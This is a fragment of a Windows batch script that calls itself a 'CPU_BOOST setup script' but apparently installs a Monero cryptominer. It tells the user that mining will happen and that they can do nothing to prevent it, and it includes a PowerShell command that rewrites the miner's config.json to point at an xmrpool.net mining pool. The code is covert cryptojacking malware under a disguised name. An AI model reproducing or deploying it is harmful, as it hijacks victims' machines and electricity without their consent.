...
rem echo CPU_BOOST setup script v%VERSION%.
...
echo Mining will happen.

if not [%EMAIL%] == [] (
echo ^(and you can do nothig to prevent it^)
)
...
powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"vegas-backup.xmrpool.net:3335\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
